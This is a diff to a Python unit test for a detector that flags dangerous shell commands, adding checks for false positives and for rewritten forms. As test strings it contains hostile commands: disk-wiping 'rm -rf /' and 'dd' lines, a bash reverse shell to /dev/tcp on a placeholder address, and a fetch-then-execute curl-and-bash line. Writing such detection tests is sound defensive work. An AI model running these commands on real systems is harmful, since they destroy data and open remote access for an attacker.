@@ -49,3 +49,23 @@ class TestShellForms(unittest.TestCase):
         self.assertIn("destructive-command", _ids("rm -rf /"))
         self.assertIn("destructive-command", _ids("dd if=/dev/zero of=/dev/sda"))
         self.assertNotIn("destructive-command", _ids("rm /etc/passwd"))
+
+    def test_everyday_commands_stay_quiet(self):
+        quiet = {
+            "curl -s https://api.github.com/repos/a/b | python3 -m json.tool": "remote-execution",
+            "curl -s https://registry.npmjs.org/react | node -e 'console.log(1)'": "remote-execution",
+            "bash -c \"curl -s https://example.com/health\"": "remote-execution",
+            "sh -c 'curl -fsS http://localhost:8080/ready'": "remote-execution",
+            "scp .env.example host:/app/": "secret-exfiltration",
+            "curl -T id_rsa.pub https://example.com/keys": "secret-exfiltration",
+        }
+        for command, rule in quiet.items():
+            self.assertNotIn(rule, _ids(command), command)
+
+    def test_rewrites_never_hide_the_original(self):
+        # The rewritten form is added next to the original command.
+        self.assertIn("rce-canary", _ids("bash -i >& /dev/tcp/10.0.0.1/4242"))
+        self.assertIn(
+            "fetch-then-execute",
+            _ids("curl http://x.tld/s.sh -o /tmp/s.sh && bash /tmp/s.sh"),
+        )
